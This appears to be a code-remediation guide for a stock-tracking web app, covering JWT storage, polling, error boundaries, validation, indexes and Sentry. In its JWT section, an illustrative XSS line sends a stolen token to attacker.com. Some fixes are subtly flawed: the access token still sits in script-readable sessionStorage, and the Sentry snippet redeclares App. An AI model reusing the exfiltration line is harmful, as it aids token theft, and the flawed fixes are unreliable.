# AlphaLens - Remediation Examples & Code Fixes

## 1. SECURITY - JWT Token Storage

### ❌ Current Problem
```javascript
// frontend/src/context/AuthContext.jsx
const login = async (email, password) => {
  const response = await api.post('/auth/login', { email, password })
  const { token, ...userData } = response.data.data
  localStorage.setItem('token', token)  // ← XSS VULNERABILITY
  api.defaults.headers.common['Authorization'] = `Bearer ${token}`
  setUser(userData)
}
```

**Risk**: Any XSS payload can steal the token:
```javascript
// Malicious script injected into DOM
const token = localStorage.getItem('token')
fetch('https://attacker.com/steal?token=' + token)
```

### ✅ Recommended Solution

**Backend** (`src/services/auth.service.js`):
```javascript
export const loginUser = async (email, password) => {
  const user = await User.findOne({ email }).select('+password')
  
  if (user && (await user.matchPassword(password))) {
    const accessToken = jwt.sign({ id: user._id }, process.env.JWT_SECRET, {
      expiresIn: '15m',  // Short-lived access token
    })
    const refreshToken = jwt.sign({ id: user._id }, process.env.REFRESH_SECRET, {
      expiresIn: '7d',   // Long-lived refresh token
    })
    
    return {
      accessToken,
      refreshToken,  // Sent as HttpOnly cookie by middleware
      user: {
        _id: user._id,
        name: user.name,
        email: user.email,
        learningMode: user.learningMode,
      }
    }
  }
}

// In auth.controller.js
export const login = asyncHandler(async (req, res) => {
  const { email, password } = req.body
  const { accessToken, refreshToken, user } = await authService.loginUser(email, password)
  
  // Send refresh token as HttpOnly cookie (immune to XSS)
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,        // Can't be accessed by JS
    secure: process.env.NODE_ENV === 'production',  // HTTPS only
    sameSite: 'strict',    // CSRF protection
    maxAge: 7 * 24 * 60 * 60 * 1000,
  })
  
  // Return access token to frontend (short-lived, in memory)
  res.status(200).json({
    success: true,
    accessToken,  // In-memory token, lost on page refresh
    user,
  })
})

// Token refresh endpoint
export const refreshToken = asyncHandler(async (req, res) => {
  const { refreshToken } = req.cookies
  
  if (!refreshToken) {
    throw new UnauthorizedError('No refresh token')
  }
  
  try {
    const decoded = jwt.verify(refreshToken, process.env.REFRESH_SECRET)
    const newAccessToken = jwt.sign({ id: decoded.id }, process.env.JWT_SECRET, {
      expiresIn: '15m',
    })
    
    res.status(200).json({
      success: true,
      accessToken: newAccessToken,
    })
  } catch (error) {
    throw new UnauthorizedError('Invalid refresh token')
  }
})
```

**Frontend** (`frontend/src/services/apiClient.js`):
```javascript
import axios from 'axios'

const api = axios.create({
  baseURL: '/api',
  withCredentials: true,  // ← Allow cookies to be sent
})

api.interceptors.request.use((config) => {
  // Access token stored in memory (lost on refresh)
  const accessToken = sessionStorage.getItem('accessToken')
  if (accessToken) {
    config.headers.Authorization = `Bearer ${accessToken}`
  }
  return config
})

api.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config
    
    // If 401 and haven't retried, try to refresh token
    if (error.response?.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true
      
      try {
        const { data } = await axios.post('/api/auth/refresh', {}, {
          withCredentials: true,  // Send refresh token cookie
        })
        
        sessionStorage.setItem('accessToken', data.accessToken)
        originalRequest.headers.Authorization = `Bearer ${data.accessToken}`
        return api(originalRequest)  // Retry original request
      } catch (refreshError) {
        // Refresh failed, redirect to login
        window.location.href = '/login'
        return Promise.reject(refreshError)
      }
    }
    
    return Promise.reject(error)
  }
)

export default api
```

**Frontend Context** (`frontend/src/context/AuthContext.jsx`):
```javascript
import { createContext, useContext, useState, useEffect } from 'react'
import api from '../services/apiClient'

const AuthContext = createContext(null)

export function AuthProvider({ children }) {
  const [user, setUser] = useState(null)
  const [loading, setLoading] = useState(true)

  useEffect(() => {
    // Restore user from API (backend validates refresh token cookie)
    const restoreSession = async () => {
      try {
        const response = await api.get('/auth/me')
        setUser(response.data.data)
      } catch (error) {
        setUser(null)
      } finally {
        setLoading(false)
      }
    }
    
    restoreSession()
  }, [])

  const login = async (email, password) => {
    const response = await api.post('/auth/login', { email, password })
    const { accessToken, user: userData } = response.data
    
    // Store access token in sessionStorage (lost on tab close)
    sessionStorage.setItem('accessToken', accessToken)
    setUser(userData)
    return userData
  }

  const logout = async () => {
    await api.post('/auth/logout')  // Backend clears refresh token cookie
    sessionStorage.removeItem('accessToken')
    setUser(null)
  }

  return (
    <AuthContext.Provider value={{ user, login, logout, loading }}>
      {children}
    </AuthContext.Provider>
  )
}
```

---

## 2. PERFORMANCE - Fix Polling Intervals

### ❌ Current Problem
```javascript
// hooks/useStocks.js
export const useStockQuote = (symbol) => {
  return useQuery({
    queryKey: ['quote', symbol],
    queryFn: () => stockService.getStockQuote(symbol),
    refetchInterval: 3000,  // ← Every 3 seconds!
    staleTime: 3000,
  })
}

// Usage in HomePage.jsx
<div className="grid grid-cols-2 md:grid-cols-4 gap-4">
  <MarketPreviewCard symbol="^GSPC" />   // 8 API calls × 3s
  <MarketPreviewCard symbol="^IXIC" />   // = 160 req/min!
  <MarketPreviewCard symbol="BTC-USD" />
  <MarketPreviewCard symbol="GC=F" />
  <!-- 4 more cards -->
</div>

// Result: 480 API calls per 3 minutes on page load
```

### ✅ Solution

```javascript
// hooks/useStocks.js
export const useStockQuote = (symbol, options = {}) => {
  const {
    enabled = true,
    refetchOnWindowFocus = true,
    isActive = false,  // ← Only refetch if user watching
  } = options
  
  return useQuery({
    queryKey: ['quote', symbol],
    queryFn: () => stockService.getStockQuote(symbol),
    enabled: enabled && !!symbol,
    // Heavy polling only when actively viewing details
    refetchInterval: isActive ? 30000 : false,  // 30s or manual
    staleTime: isActive ? 10000 : 60000,         // 10s active, 60s idle
    gcTime: 5 * 60 * 1000,                       // Cache 5 minutes
    refetchOnWindowFocus,
    retry: 2,
    retryDelay: (attemptIndex) => Math.min(1000 * 2 ** attemptIndex, 30000),
  })
}

// Usage in HomePage.jsx (card preview, no live updates needed)
const MarketPreviewCard = ({ symbol, name }) => {
  const { data: quote, isLoading } = useStockQuote(symbol, {
    isActive: false,  // ← Not actively watching, don't poll
  })
  // ...
}

// Usage in StockDetailPage.jsx (detailed view, user is watching)
const StockDetailPage = () => {
  const { symbol } = useParams()
  const { data: quote } = useStockQuote(symbol, {
    isActive: true,  // ← User is actively watching, poll every 30s
  })
  // ...
}

// Result: Homepage = 8 requests every 5 min (refresh if cached)
//         Detail page = 1 request every 30 seconds
//         Reduction: 160 req/min → 2 req/min (98% reduction!)
```

---

## 3. ERROR HANDLING - Add Error Boundaries

### ❌ Current State
```javascript
// frontend/src/App.jsx
export default function App() {
  return (
    <Routes>
      <Route path="/login" element={<PublicRoute><Login /></PublicRoute>} />
      {/* If Login component crashes, entire app crashes */}
    </Routes>
  )
}

// If StockChart crashes:
// "Uncaught TypeError: Cannot read property 'map' of undefined"
// → Entire app unusable
```

### ✅ Add Error Boundaries

```javascript
// frontend/src/components/ErrorBoundary.jsx
import React from 'react'
import { AlertTriangle, RefreshCw } from 'lucide-react'

export class ErrorBoundary extends React.Component {
  constructor(props) {
    super(props)
    this.state = {
      hasError: false,
      error: null,
      errorInfo: null,
      errorId: null,
    }
  }

  static getDerivedStateFromError(error) {
    return { hasError: true }
  }

  componentDidCatch(error, errorInfo) {
    // Generate unique error ID for tracking
    const errorId = `ERR-${Date.now()}-${Math.random().toString(36).slice(2, 9)}`
    
    this.setState({
      error,
      errorInfo,
      errorId,
    })

    // Log to error tracking service
    if (window.Sentry) {
      window.Sentry.captureException(error, {
        contexts: {
          react: {
            componentStack: errorInfo.componentStack,
          },
        },
        tags: {
          errorId,
        },
      })
    } else {
      // Fallback: log to console in development
      console.error('ErrorBoundary caught:', error, errorInfo)
    }

    // Send to analytics
    if (window.gtag) {
      window.gtag('event', 'exception', {
        description: error.toString(),
        error_id: errorId,
      })
    }
  }

  handleReset = () => {
    this.setState({ hasError: false, error: null, errorInfo: null })
  }

  render() {
    if (this.state.hasError) {
      return (
        <div className="min-h-screen bg-gradient-to-br from-red-50 to-red-100 flex items-center justify-center p-4">
          <div className="bg-white rounded-2xl shadow-2xl border-2 border-red-200 max-w-md p-8">
            <div className="flex items-center justify-center w-12 h-12 rounded-full bg-red-100 mx-auto mb-4">
              <AlertTriangle className="text-red-600" size={24} />
            </div>
            
            <h1 className="text-2xl font-bold text-gray-900 text-center mb-2">
              Oops! Something went wrong
            </h1>
            
            <p className="text-gray-600 text-center mb-4">
              We've logged this error and our team is looking into it.
            </p>
            
            <div className="bg-red-50 border border-red-200 rounded-lg p-3 mb-6">
              <p className="text-xs font-mono text-red-700 break-words">
                Error ID: {this.state.errorId}
              </p>
              {process.env.NODE_ENV === 'development' && (
                <details className="mt-2">
                  <summary className="cursor-pointer text-xs text-red-600 font-semibold">
                    Technical Details
                  </summary>
                  <pre className="text-xs text-red-700 mt-2 overflow-auto max-h-40">
                    {this.state.error?.toString()}
                    {'\n'}
                    {this.state.errorInfo?.componentStack}
                  </pre>
                </details>
              )}
            </div>
            
            <div className="flex gap-3">
              <button
                onClick={this.handleReset}
                className="flex-1 bg-blue-500 hover:bg-blue-600 text-white font-semibold py-2 px-4 rounded-lg transition-colors flex items-center justify-center gap-2"
              >
                <RefreshCw size={16} />
                Try Again
              </button>
              
              <button
                onClick={() => window.location.href = '/'}
                className="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-900 font-semibold py-2 px-4 rounded-lg transition-colors"
              >
                Go Home
              </button>
            </div>
          </div>
        </div>
      )
    }

    return this.props.children
  }
}

// Export wrapper for functional components
export function withErrorBoundary(Component) {
  return function WithErrorBoundaryComponent(props) {
    return (
      <ErrorBoundary>
        <Component {...props} />
      </ErrorBoundary>
    )
  }
}
```

**Use in App.jsx**:
```javascript
import { ErrorBoundary } from './components/ErrorBoundary'

export default function App() {
  return (
    <ErrorBoundary>
      <Routes>
        <Route path="/login" element={<PublicRoute><Login /></PublicRoute>} />
        <Route path="/register" element={<PublicRoute><Register /></PublicRoute>} />
        <Route element={<Layout />}>
          <Route path="/" element={<Home />} />
          <Route path="/search" element={<Search />} />
          <Route path="/stock/:symbol" element={<StockDetail />} />
          <Route path="/watchlist" element={<ProtectedRoute><Watchlist /></ProtectedRoute>} />
          <Route path="/settings" element={<ProtectedRoute><Settings /></ProtectedRoute>} />
        </Route>
        <Route path="*" element={<Navigate to="/" replace />} />
      </Routes>
    </ErrorBoundary>
  )
}

// Or wrap individual routes:
<Route path="/stock/:symbol" element={
  <ErrorBoundary>
    <StockDetail />
  </ErrorBoundary>
} />
```

---

## 4. CODE QUALITY - Consolidate Auth Services

### ❌ Current Problem
```
3 different patterns for auth:
1. api.js: authApi = { login: (email, password) => api.post(...) }
2. auth.service.js: authService = { login: async (credentials) => api.post(...) }
3. AuthContext.jsx: Direct api.post('/auth/login', ...)

Which one to use? Developers waste time choosing.
```

### ✅ Unified Service Pattern

```javascript
// frontend/src/services/auth.service.ts
import api from './apiClient'
import { z } from 'zod'

// Define types
export const loginSchema = z.object({
  email: z.string().email('Invalid email'),
  password: z.string().min(8, 'Password must be 8+ characters'),
})

export const registerSchema = loginSchema.extend({
  name: z.string().min(2, 'Name must be 2+ characters'),
  confirmPassword: z.string(),
}).refine((d) => d.password === d.confirmPassword, {
  message: "Passwords don't match",
  path: ['confirmPassword'],
})

export type LoginInput = z.infer<typeof loginSchema>
export type RegisterInput = z.infer<typeof registerSchema>

interface AuthResponse {
  accessToken: string
  user: {
    _id: string
    name: string
    email: string
    learningMode: 'beginner' | 'pro'
  }
}

// Single source of truth for auth API
export const authService = {
  async login(input: LoginInput): Promise<AuthResponse> {
    const { data } = await api.post('/auth/login', input)
    return data.data
  },

  async register(input: RegisterInput): Promise<AuthResponse> {
    // eslint-disable-next-line @typescript-eslint/no-unused-vars
    const { confirmPassword, ...payload } = input
    const { data } = await api.post('/auth/register', payload)
    return data.data
  },

  async getMe() {
    const { data } = await api.get('/auth/me')
    return data.data
  },

  async logout(): Promise<void> {
    await api.post('/auth/logout')
  },

  async refreshToken(): Promise<string> {
    const { data } = await api.post('/auth/refresh')
    return data.accessToken
  },

  async updatePreferences(learningMode: 'beginner' | 'pro') {
    const { data } = await api.put('/auth/preferences', { learningMode })
    return data.data
  },
}
```

**Use in Context**:
```javascript
// frontend/src/context/AuthContext.jsx
import { authService } from '../services/auth.service'

export function AuthProvider({ children }) {
  const [user, setUser] = useState(null)
  const [loading, setLoading] = useState(true)

  const login = async (email, password) => {
    const userData = await authService.login({ email, password })
    setUser(userData)
    return userData
  }

  const register = async (name, email, password, learningMode) => {
    const userData = await authService.register({
      name,
      email,
      password,
      confirmPassword: password,
      learningMode,
    })
    setUser(userData)
    return userData
  }

  // ... rest of context
}
```

---

## 5. FORM VALIDATION - Add Schema Validation

### ❌ Current Problem
```javascript
// frontend/src/pages/Login.jsx
const handleSubmit = async (e) => {
  e.preventDefault()
  if (!email || !password) {  // ← Minimal validation
    toast.error('Please fill in all fields')
    return
  }
  // No email format check, no password strength check
  // Backend also doesn't validate strictly
}
```

### ✅ Robust Validation

```javascript
// frontend/src/pages/Login.jsx
import { useForm } from 'react-hook-form'
import { zodResolver } from '@hookform/resolvers/zod'
import { loginSchema } from '../services/auth.service'
import { useAuth } from '../context/AuthContext'
import toast from 'react-hot-toast'

export default function Login() {
  const { login } = useAuth()
  const navigate = useNavigate()
  const {
    register,
    handleSubmit,
    formState: { errors, isSubmitting },
  } = useForm({
    resolver: zodResolver(loginSchema),
    mode: 'onBlur',  // Validate on blur for better UX
  })

  const onSubmit = async (data) => {
    try {
      await login(data.email, data.password)
      toast.success('Welcome back!')
      navigate('/')
    } catch (error) {
      toast.error(error.response?.data?.message || 'Login failed')
    }
  }

  return (
    <form onSubmit={handleSubmit(onSubmit)} className="space-y-4">
      <div>
        <label className="label">Email</label>
        <input
          type="email"
          {...register('email')}
          className={`input ${errors.email ? 'border-red-500' : ''}`}
          placeholder="you@example.com"
        />
        {errors.email && (
          <p className="text-red-500 text-sm mt-1">{errors.email.message}</p>
        )}
      </div>

      <div>
        <label className="label">Password</label>
        <input
          type="password"
          {...register('password')}
          className={`input ${errors.password ? 'border-red-500' : ''}`}
          placeholder="••••••••"
        />
        {errors.password && (
          <p className="text-red-500 text-sm mt-1">{errors.password.message}</p>
        )}
      </div>

      <button type="submit" disabled={isSubmitting} className="btn-primary w-full">
        {isSubmitting ? 'Signing in...' : 'Sign In'}
      </button>
    </form>
  )
}
```

---

## 6. DATABASE - Add Indexes

### ❌ Current
```javascript
// src/models/user.model.js
userSchema.index({ email: 1 })  // Only email index exists
```

### ✅ Complete Indexing Strategy

```javascript
// src/models/user.model.js
import mongoose from 'mongoose'
import bcrypt from 'bcryptjs'

const userSchema = new mongoose.Schema(
  {
    name: { type: String, required: true },
    email: {
      type: String,
      required: true,
      unique: true,
      lowercase: true,
      index: true,  // ← Login queries
    },
    password: {
      type: String,
      required: true,
      minlength: 6,
      select: false,
    },
    learningMode: {
      type: String,
      enum: ['beginner', 'pro'],
      default: 'beginner',
      index: true,  // ← Filter by learning mode
    },
  },
  { timestamps: true }
)

// Create compound indexes
userSchema.index({ createdAt: -1 })  // For sorting by registration date
userSchema.index({ email: 1, learningMode: 1 })  // For analytics queries

const User = mongoose.model('User', userSchema)
export default User

// src/models/watchlist.model.js
const watchlistSchema = new mongoose.Schema(
  {
    user: {
      type: mongoose.Schema.Types.ObjectId,
      ref: 'User',
      required: true,
      index: true,  // ← Get user's watchlist
    },
    symbols: [String],
  },
  { timestamps: true }
)

// Optimize lookup by user ID
watchlistSchema.index({ user: 1 })
watchlistSchema.index({ user: 1, updatedAt: -1 })  // Get latest watchlists

const Watchlist = mongoose.model('Watchlist', watchlistSchema)
export default Watchlist
```

**Performance Impact**:
- Before: O(n) full table scan → After: O(log n) index lookup
- Example: 1M users, finding one by email: 500ms → 5ms (100x faster)

---

## 7. MONITORING - Add Error Tracking

### Setup Sentry

```bash
npm install @sentry/react @sentry/tracing
```

```javascript
// frontend/src/main.jsx
import * as Sentry from '@sentry/react'
import { BrowserTracing } from '@sentry/tracing'
import React from 'react'
import ReactDOM from 'react-dom/client'
import App from './App'

Sentry.init({
  dsn: import.meta.env.VITE_SENTRY_DSN,
  environment: import.meta.env.MODE,
  integrations: [
    new BrowserTracing(),
    new Sentry.Replay({
      maskAllText: true,
      blockAllMedia: true,
    }),
  ],
  // Set tracesSampleRate to 1.0 to capture 100% of transactions for performance monitoring
  tracesSampleRate: import.meta.env.MODE === 'production' ? 0.1 : 1.0,
  replaysSessionSampleRate: 0.1,
  replaysOnErrorSampleRate: 1.0,
})

const App = Sentry.withProfiler(App)

ReactDOM.createRoot(document.getElementById('root')).render(
  <React.StrictMode>
    <App />
  </React.StrictMode>
)
```

**Backend Setup**:
```javascript
// src/server.js
import * as Sentry from '@sentry/node'

Sentry.init({
  dsn: process.env.SENTRY_DSN,
  environment: process.env.NODE_ENV,
  tracesSampleRate: 0.1,
})

app.use(Sentry.Handlers.requestHandler())
// Routes here
app.use(Sentry.Handlers.errorHandler())
```

**Result**: All errors now tracked, searchable, with context (user, browser, OS, etc.)

---

## Summary: Quick Implementation Checklist

- [ ] Move JWT to HttpOnly cookies (1 day)
- [ ] Add error boundaries (4 hours)
- [ ] Fix polling intervals (2 hours)
- [ ] Consolidate auth service (4 hours)
- [ ] Add form validation with Zod (6 hours)
- [ ] Add database indexes (1 hour)
- [ ] Setup Sentry error tracking (2 hours)
- [ ] Add pre-commit hooks (2 hours)

**Total estimated time: 3-4 developer days**

